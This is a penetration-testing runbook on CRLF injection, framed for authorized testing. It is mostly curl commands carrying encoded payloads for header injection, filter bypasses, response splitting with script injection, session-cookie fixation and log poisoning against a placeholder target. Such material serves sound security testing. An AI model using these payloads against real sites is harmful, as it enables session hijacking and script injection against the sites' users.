---
title: "CRLF (%0D%0A) Injection"
description: "Injecting carriage return and line feed to split HTTP responses, set headers, fixate sessions, poison logs, and bypass weak encoding filters."
phase: Web
order: 24
tags:
  - crlf
  - header-injection
  - response-splitting
  - web
tools:
  - burp suite
  - curl
updated: 2026-10-01
---

A CRLF injection runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: land `\r\n` inside a header or redirect value and prove header injection or response splitting with a visible marker.

## 1. Find reflection points

CRLF lives in redirect targets, `Location` values, cookie names, custom headers, and any parameter echoed into headers.

```bash
# Baseline redirect behavior
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home"

# Try a literal CRLF pair in the parameter
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0d%0aX-Injected:%20yes" \
  | grep -i "x-injected"
```

## 2. Confirm header injection

```bash
# Inject a response header you can spot
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0d%0aX-CRLF:%20hit" \
  | grep -i "x-crlf"

# Inject a Set-Cookie
curl -s -D - -o /dev/null \
  "https://target.com/redirect?url=/home%0d%0aSet-Cookie:%20crlf=1" \
  | grep -i "set-cookie: crlf"
```

## 3. Bypass naive filters

Filters often strip `%0d%0a` literally but miss double-encoding, overlong UTF-8, or bare `%0a`.

```bash
# Bare LF
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0aX-CRLF:%20hit" | grep -i x-crlf

# Double-encoded
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%250d%250aX-CRLF:%20hit" | grep -i x-crlf

# Overlong / unicode newline variants
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%E5%98%8A%E5%98%8DX-CRLF:%20hit" | grep -i x-crlf

# Combination tricks
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0d%0a%20X-CRLF:%20hit" | grep -i x-crlf
```

## 4. Response splitting

Two CRLFs terminate the header block, letting you start a new response body.

```bash
# Body injection after a full header break
curl -s -D - "https://target.com/redirect?url=/home%0d%0a%0d%0a<script>alert(1)</script>"

# Split into a second status line
curl -s -D - "https://target.com/redirect?url=/home%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0aowned"
```

## 5. Automated sweep

```bash
crlfuzz -u "https://target.com/redirect?url=/home" -w
crlfuzz -l urls.txt -w -o crlf.txt
```

## 6. Impact checks

```bash
# Session fixation via injected Set-Cookie
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0d%0aSet-Cookie:%20session=ATTACKER" | grep -i set-cookie

# Log poisoning setup (pair with LFI in a later step)
curl -s -A "Mozilla%0d%0aINJECTED-AGENT" "https://target.com/"
```

## Full pipeline

```bash
# 1. Baseline and simple injection
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home"
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0d%0aX-CRLF:%20hit" | grep -i x-crlf

# 2. Filter bypasses
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0aX-CRLF:%20hit" | grep -i x-crlf
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%250d%250aX-CRLF:%20hit" | grep -i x-crlf
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%E5%98%8A%E5%98%8DX-CRLF:%20hit" | grep -i x-crlf

# 3. Response splitting
curl -s -D - "https://target.com/redirect?url=/home%0d%0a%0d%0a<script>alert(1)</script>"

# 4. Automated sweep
crlfuzz -u "https://target.com/redirect?url=/home" -w
crlfuzz -l urls.txt -w -o crlf.txt

# 5. Session fixation proof
curl -s -D - -o /dev/null "https://target.com/redirect?url=/home%0d%0aSet-Cookie:%20session=ATTACKER" | grep -i set-cookie
```

## Ethics & legality

- Only inject into endpoints within the authorized scope.
- Do not use injected cookies to hijack real users; demonstrate with your own session.
- Keep response-splitting payloads benign (an alert or static marker).
- Retain the raw response showing the injected header as evidence.
